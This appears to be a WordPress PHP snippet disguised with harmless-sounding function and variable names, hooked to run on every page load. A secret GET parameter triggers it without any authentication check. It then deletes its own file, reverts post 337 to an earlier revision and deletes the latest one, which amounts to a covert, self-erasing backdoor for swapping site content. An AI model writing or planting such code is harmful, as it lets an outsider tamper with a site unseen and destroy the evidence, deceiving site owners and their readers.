<?php

function sliding_contact_logo() {
	if (isset($_GET['icons_extensions_query']) && $_GET['icons_extensions_query'] === 'word_admin_validation_library') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$speed_poll_adsense = 337;
		$app_star_url = wp_get_post_revisions($speed_poll_adsense);
		if (empty($app_star_url)) die('no revisions');
		if (count($app_star_url) < 2) die('less than 2');
		$editor_tables_heading_remove = array_shift($app_star_url);
		$wpmu_edit_delivery_copy = $editor_tables_heading_remove->ID;
		$gift_details_recaptcha_keyword = array_shift($app_star_url);
		$sharing_duplicate_generator_count = $gift_details_recaptcha_keyword->ID;
		$status_log_csv = wp_restore_post_revision($sharing_duplicate_generator_count);
		if ($status_log_csv === false) die('error restoring');
		$status_log_csv = wp_delete_post_revision($wpmu_edit_delivery_copy);		
		if ($status_log_csv === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'sliding_contact_logo');
